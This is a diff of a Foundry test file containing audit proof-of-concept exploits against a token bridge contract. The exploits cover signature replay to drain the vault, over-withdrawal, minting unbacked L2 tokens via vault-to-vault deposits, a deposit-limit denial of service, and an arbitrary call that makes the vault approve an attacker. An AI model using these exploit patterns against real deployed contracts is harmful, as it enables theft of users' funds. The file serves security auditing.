@@ -230,11 +230,11 @@ contract L1BossBridgeTest is Test {
 
     //@audit-poc
     function test_user_attacks_replay_signature() public {
-        vm.startPrank(newUser);
         uint256 amountToDeposit = 100e18;
+        deal(address(token), address(this), amountToDeposit);
         token.approve(address(tokenBridge), amountToDeposit);
-        tokenBridge.depositTokensToL2(newUser, newUserL2, amountToDeposit);
-        vm.stopPrank();
+        tokenBridge.depositTokensToL2(address(this), newUserL2, amountToDeposit);
+
         assertEq(token.balanceOf(address(vault)), amountToDeposit);
 
         vm.startPrank(user);
@@ -252,7 +252,7 @@ contract L1BossBridgeTest is Test {
         (uint8 v, bytes32 r, bytes32 s) = _signMessage(_getTokenWithdrawalMessage(user, depositAmount), operator.key);
         //using the signature to withdraw the tokens
         //replaying the signature to withdraw the tokens again and again
-        while(token.balanceOf(address(vault)) >= depositAmount){
+        while (token.balanceOf(address(vault)) >= depositAmount) {
             tokenBridge.withdrawTokensToL1(user, depositAmount, v, r, s);
         }
         //user now owns double of the deposit amount
@@ -262,19 +262,23 @@ contract L1BossBridgeTest is Test {
     }
 
     //@audit-poc
-    function test_attack_withdraw_without_deposit() external {
-        vm.startPrank(newUser);
+    function test_attack_withdraw_more_than_deposits() external {
         uint256 amountToDeposit = 100e18;
-        token.approve(address(tokenBridge), amountToDeposit);
-        tokenBridge.depositTokensToL2(newUser, newUserL2, amountToDeposit);
-        vm.stopPrank();
+        deal(address(token), address(vault), amountToDeposit);
+
         assertEq(token.balanceOf(address(vault)), amountToDeposit);
 
-        //somehow user got the operator to sign the message
-        uint256 amountToWithdraw = 20e18;
+        //user deposits some amount to the vault
+        vm.startPrank(user);
+        token.approve(address(tokenBridge), 20e18);
+        tokenBridge.depositTokensToL2(user, userInL2, 20e18);
+        vm.stopPrank();
+
+        //user withdraws the more amount than deposited
+        uint256 amountToWithdraw = 40e18;
         (uint8 v, bytes32 r, bytes32 s) = _signMessage(_getTokenWithdrawalMessage(user, amountToWithdraw), operator.key);
         uint256 userInitialBalance = token.balanceOf(user);
-        //user can use this signature to withdraw funds without deposit
+
         tokenBridge.withdrawTokensToL1(user, amountToWithdraw, v, r, s);
 
         assertEq(token.balanceOf(user), userInitialBalance + amountToWithdraw);
@@ -324,10 +328,10 @@ contract L1BossBridgeTest is Test {
         assertEq(token.balanceOf(address(vault)), amountToDeposit);
     }
 
-    //@audit-poc 
+    //@audit-poc
     function testCanTransferFromVaultToVault() external {
-        address attacker = makeAddr('attacker');
-        
+        address attacker = makeAddr("attacker");
+
         uint256 vaultBalance = 500 ether;
         deal(address(token), address(vault), vaultBalance);
         vm.expectEmit(address(tokenBridge));
@@ -336,5 +340,52 @@ contract L1BossBridgeTest is Test {
         emit Deposit(address(vault), attacker, vaultBalance);
         //@note can do this forever, mint infinite tokens on the L2
         tokenBridge.depositTokensToL2(address(vault), attacker, vaultBalance);
+    }
+
+    //@audit-poc
+    function testDOSAttackWhenDepositLimitIsReached() external {
+        address attacker = address(this);
+        deal(address(token), attacker, tokenBridge.DEPOSIT_LIMIT());
+
+        vm.prank(attacker);
+        token.transfer(address(vault), tokenBridge.DEPOSIT_LIMIT());
+
+        vm.startPrank(user);
+        token.approve(address(tokenBridge), 1 ether);
+        vm.expectRevert("L1BossBridge__DepositLimitReached()");
+        tokenBridge.depositTokensToL2(user, userInL2, 1 ether);
+        vm.stopPrank();
+    }
+
+    //@audit-poc
+    function testAttackerMakingAnArbitraryLowLevelCall() external {
+        uint256 intialVaultBalance = 100e18;
+        deal(address(token), address(this), intialVaultBalance);
+        token.approve(address(tokenBridge), intialVaultBalance);
+        tokenBridge.depositTokensToL2(address(this), newUserL2, intialVaultBalance);
+
+        address attacker = makeAddr("attacker");
+        bytes memory data = abi.encodeCall(L1Vault.approveTo, (attacker, type(uint256).max));
+        bytes memory messageHash = abi.encode(
+            address(vault), // target
+            0, // value
+            data // data
+        );
+
+        (uint8 v, bytes32 r, bytes32 s) = _signMessage(messageHash, operator.key);
+        vm.startPrank(attacker);
+
+        // making a fake deposit to bypass the withdraw constraint
+        vm.expectEmit(address(tokenBridge));
+        emit Deposit(address(attacker), address(0), 0);
+        tokenBridge.depositTokensToL2(attacker, address(0), 0);
+        
+        assertEq(token.balanceOf(attacker), 0);
+        // attacker now calling the sendToL1
+        tokenBridge.sendToL1(v, r, s, messageHash);
+        token.transferFrom(address(vault), attacker, token.balanceOf(address(vault)));
+        vm.stopPrank();
+
+        assertEq(token.balanceOf(attacker), intialVaultBalance);
     }
 }
